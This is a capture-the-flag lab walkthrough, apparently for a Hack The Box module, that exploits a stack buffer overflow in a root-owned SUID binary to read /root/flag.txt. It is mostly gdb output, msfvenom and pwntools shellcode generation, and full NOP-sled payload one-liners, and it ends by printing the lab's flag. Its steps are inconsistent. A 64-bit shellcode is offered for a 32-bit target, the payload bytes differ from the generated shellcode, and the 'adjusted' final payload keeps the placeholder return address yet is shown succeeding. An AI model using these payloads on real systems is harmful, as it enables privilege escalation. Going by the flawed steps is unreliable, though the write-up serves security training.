## Background: 

We've recycled a password to SSH into annother Linux machine during a pen test.

We login with a standard access account, htb-student. The program leave_msg allows us to leave a message for an admin.

We see that these messages are stored in "/htb-student/msg.txt," which is binary owned by the user root, and the SUID bit is set.

Let's see if we can exploit the program with Stack-Based Buffer Overflow to read the file "/root/flag.txt".


# Note:

We need to be aware that this server is using python2, so we may need to adjust our commands accordingly.

    python --version
    Python 2.7.17


# Inspect Binary:

Lets inspect the exe to see what we are working with:

    file leave_msg
    leave_msg: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8694607c1cba3fb3814a144fb014da53d3f3e49e, not stripped

The file is using 32-bit registers.


# Overflow:

Lets use gdb to test different payloads and see if we can break the program.

If the payload is sufficienly large we get:

    (gdb) r $(python -c "print('A'*3000)")
    Starting program: /home/htb-student/leave_msg $(python -c "print('A'*3000)")
    
    Program received signal SIGSEGV, Segmentation fault.
    0x41414141 in ?? ()

If we inspect the registers we see what caused the segfault:

    (gdb) info registers
    eax            0x0	0
    ecx            0x15	21
    edx            0x56558158	1448444248
    ebx            0x41414141	1094795585
    esp            0xffffc9c0	0xffffc9c0
    ebp            0x41414141	0x41414141
    esi            0xffffca00	-13824
    edi            0x0	0
    eip            0x41414141	0x41414141
    eflags         0x10282	[ SF IF RF ]
    cs             0x23	35
    ss             0x2b	43
    ds             0x2b	43
    es             0x2b	43
    fs             0x0	0
    gs             0x63	99

- We've overwritten EIP.

Now that we know we can overwrite the Instruction Pointer, lets see how many bytes it takes to reach EIP.

- To do this well adjust the payload to a "x" number of A characters, and 4 B characters.

        (gdb) r $(python -c "print('A'*2060+'B'*4)")
        Starting program: /home/htb-student/leave_msg $(python -c "print('A'*2060+'B'*4)")
        
        Program received signal SIGSEGV, Segmentation fault.
        0x42424242 in ?? ()

- Since the 32-bit register has been overwritten by 4 bytes of "42", we now know that we need to send 2060 bytes before we reach EIP.


# Stack Size:

To inspect the stack size we'll run:

    (gdb) info proc mappings
    process 2185
    Mapped address spaces:
    
    	Start Addr   End Addr       Size     Offset objfile
    	0x56555000 0x56556000     0x1000        0x0 /home/htb-student/leave_msg
    	0x56556000 0x56557000     0x1000        0x0 /home/htb-student/leave_msg
    	0x56557000 0x56558000     0x1000     0x1000 /home/htb-student/leave_msg
    	0x56558000 0x56579000    0x21000        0x0 [heap]
    	0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
    	0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
    	0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
    	0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
    	0xf7fc3000 0xf7fc6000     0x3000        0x0 
    	0xf7fcf000 0xf7fd1000     0x2000        0x0 
    	0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
    	0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
    	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
    	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
    	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
    	0xfffdc000 0xffffe000    0x22000        0x0 [stack]

The stack size is: 0x22000


# Read The Flag:

Now that we know how to set EIP, lets exploit the program to read a file with root privileges.

First lets start by generating shell code that can cat a file.

- We can use pwntools for this: (https://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.cat)

We'll need to make a flag to test the code:

    echo "HTB{f4lS3_fLag}" > flag.txt

Now use shellcodePwn.py to generatecode to read the file "flag.txt":

    ./Documents/Scripts/shellcode.py
    Shellcode contains N bytes: 44
    
    6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05

Next, we'll test it:

    ./shellcodeRun.py -s 6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
    Shellcode Output:
    HTB{f4lS3_fLag}

Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":

    ./Documents/Scripts/shellcode.py
    Shellcode contains N bytes: 64
    
    48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05



# Payload:

We'll use msfvenom to find a sutable exploit. Our target uses 32-bit registers so we'll need to filter for "linux/x86":

    msfvenom -l payloads | grep 'linux/x86'
        linux/x86/adduser     Create a new user with UID 0
        ...
        linux/x86/read_file   Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor

Next, we'll generate shellcode to read /root/flag.txt:

    msfvenom -p linux/x86/read_file PATH=/root/flag.txt FD=1 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
    Found 11 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 103 (iteration=0)
    x86/shikata_ga_nai chosen with final size 103
    Payload size: 103 bytes
    Final size of c file: 460 bytes
    Saved as: shellcode


    cat shellcode
    unsigned char buf[] = 
    "\xda\xca\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x14\xbb\x2e\x1c"
    "\x18\xb8\x31\x5f\x17\x03\x5f\x17\x83\xe9\x18\xfa\x4d\x1e"
    "\x16\x42\xa8\xe0\x57\xb2\xe8\xd1\x9e\x7f\x8e\x98\xe2\x38"
    "\x8c\x9a\xe4\x38\x1a\x7d\x6d\xc1\xa6\x81\x7e\x32\xd7\x4c"
    "\xfe\xbb\x15\xf6\xfb\xbb\x99\x06\xbf\xbd\x99\x06\xbf\x70"
    "\x19\xbe\xbe\x8a\x1a\xbe\x7b\x8a\x1a\xbe\x7b\x46\x9a\x56"
    "\xbe\xa7\x64\x59\x6e\x2a\xf4\xca\x05\xe5\x6c\x78\x87\x9e"
    "\x5e\xf4\x3f\x15\x9f";


Now that we've got a shellcode, lets craft a payload. Our requirements are:

- 2060 bytes + pointer to shellcode.
- 64 bytes (128 chars) for shellcode.
- Lets add 100 bytes of no operation instruction (NOPS)

         Buffer = "\x41" * (2060 - 100 - 103) = 1857
           NOPs = "\x90" * 100
      Shellcode = b'\xbf...\xa0'
            EIP = "\x5a" * 4


Letscraft our payload and write it to a file:

    run $(python -c "print(b'\x41'*(2060-100-103) + b'\x90'*100 + b'\xbf\xd5\x4d\x07\xb9\xdb\xc2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x14\x31\x7e\x12\x83\xc6\x04\x03\xab\x43\xe5\x4c\xb8\x6a\x51\xab\x3e\x93\xa1\xef\x0f\x5a\x6c\x8f\xe6\x9f\xd7\x93\xf8\x1f\x28\x1d\x1f\x96\xd1\xa7\xdf\xb9\x21\xd8\x12\x39\xa8\x1a\x14\x3e\xab\x9a\x64\x84\xaa\x9a\x64\xfa\x61\x1a\xdc\xfb\x79\x1b\x1c\x47\x79\x1b\x1c\xb7\xb7\x9b\xf4\x72\xb8\x63\xfb\x52\x35\xf3\x6c\xd9\x96\x6d\x1e\x40\x8e\x5f\xaa\xfa\x24\xa0' + b'\x5a'*4)")

When we test this out we get:

    (gdb) run $(python -c "print(b'\x41'*(2060-100-103) + b'\x90'*100 + b'\xbf\xd5\x4d\x07\xb9\xdb\xc2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x14\x31\x7e\x12\x83\xc6\x04\x03\xab\x43\xe5\x4c\xb8\x6a\x51\xab\x3e\x93\xa1\xef\x0f\x5a\x6c\x8f\xe6\x9f\xd7\x93\xf8\x1f\x28\x1d\x1f\x96\xd1\xa7\xdf\xb9\x21\xd8\x12\x39\xa8\x1a\x14\x3e\xab\x9a\x64\x84\xaa\x9a\x64\xfa\x61\x1a\xdc\xfb\x79\x1b\x1c\x47\x79\x1b\x1c\xb7\xb7\x9b\xf4\x72\xb8\x63\xfb\x52\x35\xf3\x6c\xd9\x96\x6d\x1e\x40\x8e\x5f\xaa\xfa\x24\xa0' + b'\x5a'*4)")
    Starting program: /home/htb-student/leave_msg $(python -c "print(b'\x41'*(2060-100-103) + b'\x90'*100 + b'\xbf\xd5\x4d\x07\xb9\xdb\xc2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x14\x31\x7e\x12\x83\xc6\x04\x03\xab\x43\xe5\x4c\xb8\x6a\x51\xab\x3e\x93\xa1\xef\x0f\x5a\x6c\x8f\xe6\x9f\xd7\x93\xf8\x1f\x28\x1d\x1f\x96\xd1\xa7\xdf\xb9\x21\xd8\x12\x39\xa8\x1a\x14\x3e\xab\x9a\x64\x84\xaa\x9a\x64\xfa\x61\x1a\xdc\xfb\x79\x1b\x1c\x47\x79\x1b\x1c\xb7\xb7\x9b\xf4\x72\xb8\x63\xfb\x52\x35\xf3\x6c\xd9\x96\x6d\x1e\x40\x8e\x5f\xaa\xfa\x24\xa0' + b'\x5a'*4)")
    
    Program received signal SIGSEGV, Segmentation fault.
    0x5a5a5a5a in ?? ()

- As we can see we've successfully overwritten EIP with 4 Z's (0x5a).

Now we need to find where the shellcode is stored in memory:

    (gdb) x/32xg $esp+2372
    0xffffd6b4:	0x4141414141414141	0x4141414141414141
    0xffffd6c4:	0x4141414141414141	0x9090904141414141
    0xffffd6d4:	0x9090909090909090	0x9090909090909090
    0xffffd6e4:	0x9090909090909090	0x9090909090909090
    0xffffd6f4:	0x9090909090909090	0x9090909090909090
    0xffffd704:	0x9090909090909090	0x9090909090909090
    0xffffd714:	0x9090909090909090	0x9090909090909090
    0xffffd724:	0x9090909090909090	0x9090909090909090
    0xffffd734:	0xc2dbb9074dd5bf90	0xb1c9315ef42474d9
    0xffffd744:	0x0304c683127e3114	0xab516ab84ce543ab
    0xffffd754:	0x8f6c5a0fefa1933e	0x1d281ff893d79fe6
    0xffffd764:	0xd821b9dfa7d1961f	0x9aab3e141aa83912
    0xffffd774:	0x1a61fa649aaa8464	0x1b79471c1b79fbdc
    0xffffd784:	0x63b872f49bb7b71c	0x6d96d96cf33552fb
    0xffffd794:	0xa024faaa5f8e401e	0x5f534c005a5a5a5a
    0xffffd7a4:	0x723d53524f4c4f43	0x303d69643a303d73

- It starts at: 0xffffd734

So lets adjust our payload to point EIP to this address:

- Note: Little endian:

        0xffffd734 -> \x34\xd7\xff\xff

So now we have:

    python -c "print(b'\x41'*(2060-100-103) + b'\x90'*100 + b'\xbf\xd5\x4d\x07\xb9\xdb\xc2\xd9\x74\x24\xf4\x5e\x31\xc9\xb1\x14\x31\x7e\x12\x83\xc6\x04\x03\xab\x43\xe5\x4c\xb8\x6a\x51\xab\x3e\x93\xa1\xef\x0f\x5a\x6c\x8f\xe6\x9f\xd7\x93\xf8\x1f\x28\x1d\x1f\x96\xd1\xa7\xdf\xb9\x21\xd8\x12\x39\xa8\x1a\x14\x3e\xab\x9a\x64\x84\xaa\x9a\x64\xfa\x61\x1a\xdc\xfb\x79\x1b\x1c\x47\x79\x1b\x1c\xb7\xb7\x9b\xf4\x72\xb8\x63\xfb\x52\x35\xf3\x6c\xd9\x96\x6d\x1e\x40\x8e\x5f\xaa\xfa\x24\xa0' + b'\x5a'*4)" > payload

If we execute this in gdb, the read output is not legible, so instead we can write it to a file and pass that to leave_msg:

./leave_msg $(cat payload)
HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}
